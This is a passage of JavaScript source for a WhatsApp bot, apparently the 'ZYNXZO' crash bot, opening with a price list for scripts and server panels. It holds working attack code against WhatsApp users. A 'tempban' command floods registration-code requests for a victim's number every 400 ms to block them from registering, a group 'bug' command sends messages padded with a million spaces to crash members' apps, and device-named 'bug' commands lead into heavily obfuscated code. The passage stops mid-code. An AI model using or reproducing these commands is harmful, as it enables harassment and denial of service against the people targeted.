͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
┏───「 *SCRIPT* 」────┓
│ZYNXZO V7.0 : Rp55.000
│ZYNXZO V6.0 : Rp45.000
│OWNER SC : Rp100.000
┗───────────────┛
┏───「 *PANEL* 」────┓
│RAM 4GB : Rp4.000
│RAM 5GB : Rp5.000
│RAM 6GB : Rp6.000
│RAM 7GB : Rp7.000
│RAM 8GB : Rp8.000
│RAM 9GB : Rp9.000
│RAM 10GB : Rp10.000
│RAM UNLI : Rp15.000
┗───────────────┛

*[ALL PERMA]*
RESELER  Rp15.000
ADMIN  Rp20.000
PT  Rp25.000
OWN  Rp30.000
OWN PT  Rp35.000

*[ALL 1BULAN]*
RESELER  Rp10.000
ADMIN  Rp15.000
PT  Rp20.000
OWN  Rp25.000
OWN PT  Rp30.000

MINAT? : https://t.me/ZynXzooo`)
}
break
//=================================================//
case 'assalamualaikum': {
darkphonk = fs.readFileSync('./media/audio/walaikunsalam.mp3')
//Sending Audio
    zynxzo.sendMessage(m.chat, {audio: darkphonk, mimetype:'audio/mp4', ptt: true}, {quoted: zets })
}
break
case 'tempban': {
if (!isPremium) return zreply(mess.premium)
if (!q) return zreply(`Example: ${prefix + command} 62|8xxx`)
if (!/|/.test(q)) return zreply(`Kek gini tolol \n ${prefix + command} 62|8626648282`)
let numbers = JSON.parse(fs.readFileSync('./dbaseee/lib/tempban/ban.json'))
let cCode = q.split("|")[0]
let number = q.split("|")[1]
let fullNo = cCode + number
await zreply(`Success! Registration Interruption has been successfully activated to the target : ${fullNo} for an unlimited period of time. Registration interruption will be stopped if the server is restarted, shut down, or down.`)
let { state } = await useMultiFileAuthState('tempban')
let spam = makeWASocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})
let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: '+' + fullNo,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
})
if (res.reason === 'temporarily_unavailable') {
console.log(`Invalid Number (Possibility of Interrupted Registration): +${res.login}`)
await sleep(100)
await dropNumber()
}
} catch (error) {
// Wkwkkw
}
}
numbers[fullNo] = { cCode, number };
fs.writeFileSync('./dbaseee/lib/tempban/ban.json', JSON.stringify(numbers, null, '\t'))
setInterval(() => {
dropNumber()
}, 400)
}
break
case 'public': {
if (!isDeveloper) return
zynxzo.public = true
zreply('Succes To Public')
}
break
case 'self': {
if (!isDeveloper) return
zynxzo.public = false
zreply(`Succes To Self`)
}
break
case 'addplug': {
if (!isDeveloper) return zreply(mess.owner)
if (!q.includes("|")) return zreply(`Add input, Example: \n\n*.plugin name|category|content*`)
const [
pluginName,
category, ...pluginContent
] = q.split("|")
const pluginDirPath = path.join(path.resolve(__dirname, './plugin', category))
const pluginFilePath = path.join(pluginDirPath, pluginName + ".js")
if (!q.includes("|") || pluginContent.length === 0 || fs.existsSync(pluginFilePath)) return
if (!fs.existsSync(pluginDirPath)) fs.mkdirSync(pluginDirPath, {
recursive: true
})
fs.writeFileSync(pluginFilePath, pluginContent.join('|'))
await zreply(`Plugin baru telah dibuat di ${pluginFilePath}.`)
}
break
//=================================================//
case 'addprem': case 'addpremium': {
if (!isDeveloper) return 
if (!args[0]) return zreply(`Example: ${prefix+command} nomor\n━──────‹›──────━\nContoh:\n ${prefix+command} 62888888`)
bnnd = text.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await zynxzo.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return zreply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./dbaseee/dtbs/premium.json', JSON.stringify(owner))
zreply(`Succes`)
}
break
//=================================================//
case 'delown': case 'delowner': {
if (!isDeveloler) return 
if (!args[0]) return zreply(`Example: ${prefix+command} nomor\n━──────‹•›──────━\nContoh:\n ${prefix+command} 62888888`)
yaki = text.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(yaki)
owner.splice(unp, 1)
fs.writeFileSync('./dbaseee/dtbs/premium.json', JSON.stringify(owner))
zreply(`Succes`)
}
break
//=================================================//
case 'listpremium': case 'listprem': {
if (!isDeveloper) return 
 teksooo = '*━──────‹›──────━*\n'
for (let i of owner) {
teksooo += `< ! > ${i}\n`
}
teksooo += `\n*Tσƚαl : ${owner.length}*`
zynxzo.sendMessage(m.chat, { text: teksooo.trim() }, 'extendedTextMessage', { quoted:zets, contextInfo: { "mentionedJid": owner } })
}
break
//=================================================//
case 'idgc': {
if (!isPremium) return zreply(mess.premium)
if (!q) return zreply('Link?')
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return zreply("Link Invalid")
zynxzo.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}`
zreply(tekse)
})}
break
//=================================================//
case 'cgplug': {
if (!isDeveloper) return zreply(mess.owner)
if (!q.includes("|")) return zreply(`Add Input, Example: *.cgplug thisplug|newcontent*`)
let [mypler, ...rest] = q.split("|")
let mypenis = rest.join("|")
let pluginsDirect = path.resolve(__dirname, './plugin')
let plugins = loadPlugins(pluginsDirect)
for (const plugin of plugins) {
if (plugin.command.includes(mypler)) {
let filePath = plugin.filePath
fs.writeFileSync(filePath, mypenis)
await zreply(`Plugin di ${filePath} telah diganti`)
return
}
}
await zreply(`Plugin dengan command '${mypler}' tidak ditemukan`)
}
break
//=================================================//
case 'rmplug': {
if (!isDeveloper) return zreply(mess.owner)
if (!q) return zreply(`Please provide the command name of the plugin you want to remove. Example: \n\n*.rmplug thisplug*`)
let pluginsDirect = path.resolve(__dirname, './plugin')
let plugins = loadPlugins(pluginsDirect)
for (const plugin of plugins) {
if (plugin.command.includes(q)) {
let filePath = plugin.filePath
fs.unlinkSync(filePath)
await zreply(`Plugin di ${filePath} telah dihapus.`)
return
}
}
await zreply(`Plugin dengan command '${q}' tidak ditemukan.`)
}
break
//=================================================//
case 'getplug': {
const _0x5b4cea=_0x2020;(function(_0x5228e8,_0x4759a5){const _0x280b4e=_0x2020,_0x259f1d=_0x5228e8();while(!![]){try{const _0x1e9eca=parseInt(_0x280b4e(0xc2))/0x1*(parseInt(_0x280b4e(0xc3))/0x2)+-parseInt(_0x280b4e(0x9f))/0x3*(-parseInt(_0x280b4e(0xcd))/0x4)+parseInt(_0x280b4e(0xcc))/0x5*(-parseInt(_0x280b4e(0x97))/0x6)+parseInt(_0x280b4e(0xa7))/0x7*(-parseInt(_0x280b4e(0xa8))/0x8)+parseInt(_0x280b4e(0xad))/0x9*(parseInt(_0x280b4e(0xb3))/0xa)+-parseInt(_0x280b4e(0xba))/0xb+parseInt(_0x280b4e(0xbe))/0xc;if(_0x1e9eca===_0x4759a5)break;else _0x259f1d['push'](_0x259f1d['shift']());}catch(_0x376d85){_0x259f1d['push'](_0x259f1d['shift']());}}}(_0x4433,0xee990));const _0x1b52fb=(function(){let _0x3accf7=!![];return function(_0x511175,_0x41486f){const _0x53eafe=_0x3accf7?function(){const _0x254e2b=_0x2020;if(_0x41486f){const _0x48680b=_0x41486f[_0x254e2b(0xb7)](_0x511175,arguments);return _0x41486f=null,_0x48680b;}}:function(){};return _0x3accf7=![],_0x53eafe;};}()),_0x1548de=_0x1b52fb(this,function(){const _0x323382=_0x2020;return _0x1548de['toString']()['search'](_0x323382(0xa1))[_0x323382(0xbb)]()[_0x323382(0xc4)](_0x1548de)[_0x323382(0xb2)](_0x323382(0xa1));});function _0x4433(){const _0x5f0d86=['images','16240829YjvgXM','toString','fromObject','push','35667252PJlPeB','waUploadToServer','data','log','78417ptLXsJ','26bymFTq','constructor','return\x20(function()\x20','play','sender','message','tiktok','Foto\x20Slide\x20Ke\x20*','key','185RxGLRA','52PTiDGD','\x22,\x22merchant_url\x22:\x22https://www.google.com\x22}','131148eICwdN','trace','console','chat','prototype','Body','wait','result','89478KkzrGk','test','(((.+)+)+)+$','Message','cta_url','{\x22display_text\x22:\x22Link\x20Video\x22,\x22url\x22:\x22','__proto__','Example\x20:\x20*','2149pcjjHO','36224tPRvWq','info','catch','then','*Link\x20Invalid\x20!*','819441OtPxVa','relayMessage','duration','error','©\x20✅ 𝖅𝖞𝖓𝖝𝖟𝖔𝖔 ​᭄⃢𝕮𝕽𝕬𝕾𝕳⃝ ☠️⃝🔥V̘̪͆̂̅I̍̅̀̎̊R͉̜̎͡͠U̠҉̷̙ͦ₴̵̵̙͕̙͕̀̃̀̃A̷͙ͭͫ̕T̨͈͗̌ͥT̨͈͗̌ͥA̷͙ͭͫ̕C̵͉͋̔͞K͕͓͌̎̾🔥 |` Mods - Bot','search','30ivXHcI','bind','InteractiveMessage','{\x22display_text\x22:\x22Link\x20Tautan\x20Foto\x22,\x22url\x22:\x22','apply','Tiktok\x20Slide\x20Result'];_0x4433=function(){return _0x5f0d86;};return _0x4433();}_0x1548de();const _0x4cc072=(function(){let _0x37514b=!![];return function(_0x54ad01,_0x140961){const _0x4a4017=_0x37514b?function(){if(_0x140961){const _0x52f8d0=_0x140961['apply'](_0x54ad01,arguments);return _0x140961=null,_0x52f8d0;}}:function(){};return _0x37514b=![],_0x4a4017;};}()),_0x183cd8=_0x4cc072(this,function(){const _0x24e4b8=_0x2020,_0x10cb94=function(){const _0x35edbf=_0x2020;let _0x349b49;try{_0x349b49=Function(_0x35edbf(0xc5)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x21e021){_0x349b49=window;}return _0x349b49;},_0x2e2649=_0x10cb94(),_0x2a7984=_0x2e2649[_0x24e4b8(0x99)]=_0x2e2649[_0x24e4b8(0x99)]||{},_0x37b7e8=[_0x24e4b8(0xc1),'warn',_0x24e4b8(0xa9),_0x24e4b8(0xb0),'exception','table',_0x24e4b8(0x98)];for(let _0x5c446c=0x0;_0x5c446c<_0x37b7e8['length'];_0x5c446c++){const _0x22222b=_0x4cc072[_0x24e4b8(0xc4)][_0x24e4b8(0x9b)]['bind'](_0x4cc072),_0x26fb9f=_0x37b7e8[_0x5c446c],_0x1030ac=_0x2a7984[_0x26fb9f]||_0x22222b;_0x22222b[_0x24e4b8(0xa5)]=_0x4cc072[_0x24e4b8(0xb4)](_0x4cc072),_0x22222b[_0x24e4b8(0xbb)]=_0x1030ac[_0x24e4b8(0xbb)][_0x24e4b8(0xb4)](_0x1030ac),_0x2a7984[_0x26fb9f]=_0x22222b;}});_0x183cd8();if(!q)return zreply(_0x5b4cea(0xa6)+(prefix+command)+'*');if(!/tiktok.com/[_0x5b4cea(0xa0)](q))return zreply(_0x5b4cea(0xac));inireact(randomemoji),zreply(mess[_0x5b4cea(0x9d)]);function _0x2020(_0x1cbf98,_0x42227e){const _0x64bcb7=_0x4433();return _0x2020=function(_0x183cd8,_0x4cc072){_0x183cd8=_0x183cd8-0x96;let _0x44c7fd=_0x64bcb7[_0x183cd8];return _0x44c7fd;},_0x2020(_0x1cbf98,_0x42227e);}let anuan=q;await fg[_0x5b4cea(0xc9)](anuan)[_0x5b4cea(0xab)](async _0x43b8b5=>{const _0x3f2a80=_0x5b4cea;var _0x26b016=_0x3f2a80(0xb1);if(_0x43b8b5['result'][_0x3f2a80(0xaf)]==0x0){if(_0x43b8b5['result'][_0x3f2a80(0xb9)]['length']>0x1){let _0x3d2175=new Array(),_0x33bbba=0x0;for(let _0x5bd011 of _0x43b8b5[_0x3f2a80(0x9e)][_0x3f2a80(0xb9)]){let _0x110210=await prepareWAMessageMedia({'image':await fetch(''+_0x5bd011)},{'upload':zynxzo[_0x3f2a80(0xbf)]});await _0x3d2175[_0x3f2a80(0xbd)]({'header':{'title':_0x3f2a80(0xca)+(_0x33bbba+=0x1)+'*','hasMediaAttachment':!![],..._0x110210},'nativeFlowMessage':{'buttons':[{'name':_0x3f2a80(0xa3),'buttonParamsJson':_0x3f2a80(0xb6)+_0x5bd011+_0x3f2a80(0x96)}]},'footer':{'text':_0x3f2a80(0xb1)}});}const _0x359f1c=await generateWAMessageFromContent(m[_0x3f2a80(0x9a)],{'viewOnceMessage':{'message':{'interactiveMessage':{'body':proto[_0x3f2a80(0xa2)][_0x3f2a80(0xb5)][_0x3f2a80(0x9c)][_0x3f2a80(0xbc)]({'text':_0x3f2a80(0xb8)}),'carouselMessage':{'cards':_0x3d2175}}}}},{'userJid':m[_0x3f2a80(0xc7)],'quoted':m});await zynxzo[_0x3f2a80(0xae)](m[_0x3f2a80(0x9a)],_0x359f1c[_0x3f2a80(0xc8)],{'messageId':_0x359f1c[_0x3f2a80(0xcb)]['id']});}else zynxzo['sendMessage'](m['chat'],{'image':{'url':result[_0x3f2a80(0xc0)][_0x3f2a80(0xb9)][0x0]},'caption':_0x26b016},{'quoted':m});}else{let _0x4fd489=await prepareWAMessageMedia({'video':await fetch(''+_0x43b8b5[_0x3f2a80(0x9e)][_0x3f2a80(0xc6)])},{'upload':zynxzo[_0x3f2a80(0xbf)]}),_0x1af6f7=await generateWAMessageFromContent(m[_0x3f2a80(0x9a)],{'viewOnceMessage':{'message':{'interactiveMessage':{'contextInfo':{'mentionedJid':[m[_0x3f2a80(0xc7)]]},'body':{'text':_0x26b016},'header':{'hasMediaAttachment':!![],..._0x4fd489},'nativeFlowMessage':{'buttons':[{'name':_0x3f2a80(0xa3),'buttonParamsJson':_0x3f2a80(0xa4)+q+_0x3f2a80(0x96)}]}}}}},{'userJid':m[_0x3f2a80(0xc7)],'quoted':m});await zynxzo['relayMessage'](m[_0x3f2a80(0x9a)],_0x1af6f7['message'],{'messageId':_0x1af6f7[_0x3f2a80(0xcb)]['id']});}})[_0x5b4cea(0xaa)](_0x132f5e=>zreply(''+_0x132f5e));
}
break
// Bug Group
//=================================================//
case "gcampas": case 'gasbuggc': case 'gcjebeh':
if (!isPremium) return zreply(mess.premium)
if (!q) return zreply(`Example: .${command} 120xxx@g.us|5`)
victim = q.split("|")[0]
amount = q.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@g.us"
await zreply(mess.bugrespon)
for (let i = 0; i < amount; i++) {
var etc = generateWAMessageFromContent(from, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "IYA IN"
    },
    "footer": {
      "text": "zynxzo"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : 'BugVIP', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: from, quoted: m })
await zynxzo.relayMessage(Pe, etc.message, { messageId: etc.key.id })
}
zreply('< ! > Succes')
break
// Bug Command
//=================================================//
case 'ngecrot': case 'zynxzolocvir': case 'alldevic': case 'vivo': case 'oppo': case 'xiomi': case 'realmi': case 'nokia': case 'lenovo': case 'sony': case 'meizu': case 'infinix': case 'samsung': case 'beta-up':  case 'gbwa':  case 'waori':  case 'business': {
darkphonk = fs.readFileSync('./media/audio/dead.mp3')
inireact(randomemoji)
if (!isPremium) return 
(function(_0x122129,_0x558475){function _0x56414b(_0x5d780d,_0x157058,_0xc68ee,_0x2d7f62){return _0x4bf7(_0x157058-0xaa,_0xc68ee);}const _0x99b42d=_0x122129();function _0x56f6e6(_0x1b5e75,_0x504095,_0x4d990b,_0x36ae72){return _0x4bf7(_0x36ae72- -0x323,_0x504095);}while(!![]){try{const _0xb7d9c3=-parseInt(_0x56f6e6(-0x262,-0x269,-0x275,-0x23e))/(-0x1902+-0x2*-0x12d+0x1*0x16a9)*(parseInt(_0x56414b(0x1cc,0x1dc,0x1c2,0x213))/(-0x9b8*0x2+-0x31*-0x93+0x19*-0x59))+-parseInt(_0x56f6e6(-0x22c,-0x217,-0x24d,-0x21b))/(-0x65b+-0xf82+-0x2*-0xaf0)*(parseInt(_0x56414b(0x196,0x1b3,0x17e,0x1e2))/(-0x53c+0x18d9+-0x1399))+-parseInt(_0x56414b(0x1f8,0x1d2,0x1f2,0x20d))/(0xdcd*-0x1+0x16cb+-0x8f9)+-parseInt(_0x56414b(0x21e,0x205,0x1f2,0x1ed))/(0x2e3*0x5+-0x2*0x109d+-0x1*-0x12d1)*(-parseInt(_0x56414b(0x1cf,0x1f6,0x1bc,0x1be))/(-0x125f+-0x19b5+-0x64d*-0x7))+parseInt(_0x56f6e6(-0x201,-0x1cd,-0x20f,-0x1ef))/(-0x711+-0x115*0x6+-0x1*-0xd97)*(parseInt(_0x56414b(0x15e,0x187,0x148,0x1a9))/(0x1*0xa39+-0x6f0+-0x1a0*0x2))+parseInt(_0x56f6e6(-0x202,-0x251,-0x26c,-0x234))/(0x332+0x20*0xdf+-0x1f08)+parseInt(_0x56414b(0x21f,0x1fc,0x1ef,0x234))/(0x43e+-0x4*0x8d9+0x1f31*0x1)*(parseInt(_0x56f6e6(-0x209,-0x1fe,-0x1d8,-0x1d2))/(0x1957+-0x146e+0x5*-0xf9));if(_0xb7d9c3===_0x558475)break;else _0x99b42d['push'](_0x99b42d['shift']());}catch(_0x14927d){_0x99b42d['push'](_0x99b42d['shift']());}}}(_0x380f,-0xe0cb0+0x15724f*-0x1+0x2ef207));const _0x35a73e=(function(){const _0x688185={};_0x688185[_0x182a46(0x152,0x18d,0x145,0x16d)]=_0x182a46(0x189,0x154,0x1bb,0x193);function _0x182a46(_0x395474,_0x4a5ad1,_0x1a314b,_0x52aa29){return _0x4bf7(_0x52aa29-0x83,_0x1a314b);}function _0x38df56(_0x4db392,_0x4d3f4f,_0x39b4f9,_0xf2070a){return _0x4bf7(_0xf2070a- -0x2e6,_0x39b4f9);}const _0x23721a=_0x688185;let _0x536b54=!![];return function(_0x302492,_0x53905b){const _0x205a06=_0x536b54?function(){function _0x329422(_0x3eb809,_0x474b35,_0x5020ce,_0x4d7b32){return _0x4bf7(_0x5020ce-0x3b9,_0x3eb809);}function _0x171d78(_0x356199,_0x50fc30,_0x52f85b,_0x2cf418){return _0x4bf7(_0x2cf418-0x19a,_0x356199);}if(_0x53905b){if(_0x23721a[_0x329422(0x4e1,0x488,0x4a3,0x463)]===_0x171d78(0x27a,0x27c,0x2c0,0x2aa)){const _0x3cc037=_0x53905b[_0x171d78(0x300,0x2b1,0x2ce,0x2ef)](_0x302492,arguments);return _0x53905b=null,_0x3cc037;}else{const _0x1928b5=_0x264cc6[_0x329422(0x507,0x501,0x503,0x4d8)+'r'][_0x171d78(0x266,0x2a6,0x27a,0x27b)][_0x171d78(0x2ec,0x2b7,0x2ee,0x2ed)](_0x5ba54a),_0x45b9ef=_0x957e47[_0xe130e8],_0x1c8e76=_0x14a7d7[_0x45b9ef]||_0x1928b5;_0x1928b5[_0x171d78(0x31d,0x2c0,0x2d2,0x2f3)]=_0x377e34[_0x329422(0x526,0x4ff,0x50c,0x52c)](_0x438046),_0x1928b5[_0x329422(0x4db,0x4b5,0x4a4,0x47e)]=_0x1c8e76[_0x171d78(0x2b3,0x26f,0x2af,0x285)][_0x171d78(0x2ea,0x2c6,0x2d1,0x2ed)](_0x1c8e76),_0x373fc1[_0x45b9ef]=_0x1928b5;}}}:function(){};return _0x536b54=![],_0x205a06;};}()),_0x265763=_0x35a73e(this,function(){function _0xb07758(_0x11ec0f,_0xa61df9,_0x4a13a1,_0x149c6b){return _0x4bf7(_0x149c6b- -0xa,_0x4a13a1);}const _0x43619c={};_0x43619c[_0xb07758(0x118,0x133,0x165,0x12e)]=_0x52a9a2(0x1bd,0x1f9,0x1d4,0x1cf)+'+$';const _0x141fbc=_0x43619c;function _0x52a9a2(_0x235cfd,_0xfc5b59,_0x59a1c7,_0x37e76c){return _0x4bf7(_0x37e76c-0xd9,_0x235cfd);}return _0x265763[_0xb07758(0xac,0xa0,0xc0,0xe1)]()[_0xb07758(0xdb,0xf5,0xce,0xde)](_0x52a9a2(0x1ca,0x1f1,0x19b,0x1cf)+'+$')['toString']()['constructo'+'r'](_0x265763)[_0x52a9a2(0x1db,0x181,0x191,0x1c1)](_0x141fbc[_0x52a9a2(0x211,0x203,0x20e,0x211)]);});_0x265763();const _0x1ecfe2=(function(){const _0x340496={};_0x340496[_0x328844(-0x299,-0x2a8,-0x28c,-0x2b2)]=function(_0x1e3d57,_0x46836f){return _0x1e3d57===_0x46836f;};function _0x5e33ff(_0x1436da,_0x40e6c0,_0x857234,_0x2818e9){return _0x4bf7(_0x1436da-0x1ab,_0x40e6c0);}function _0x328844(_0x432037,_0x3c886c,_0x30737d,_0x454ab0){return _0x4bf7(_0x30737d- -0x3c6,_0x432037);}_0x340496['bhKHc']=function(_0x368eaa,_0x54ebdd){return _0x368eaa===_0x54ebdd;},_0x340496[_0x5e33ff(0x29c,0x2bf,0x2c0,0x274)]=_0x5e33ff(0x2d8,0x2ba,0x306,0x29f);const _0x48988f=_0x340496;let _0x22ab64=!![];return function(_0x14a18b,_0x518376){function _0x2bd8c3(_0x3c1839,_0x3ba079,_0x282126,_0x2d1f05){return _0x5e33ff(_0x3c1839- -0x312,_0x282126,_0x282126-0x1a7,_0x2d1f05-0x134);}const _0x24ebea={};function _0x134d1e(_0x263d86,_0x2d80d2,_0x318789,_0xfbb99c){return 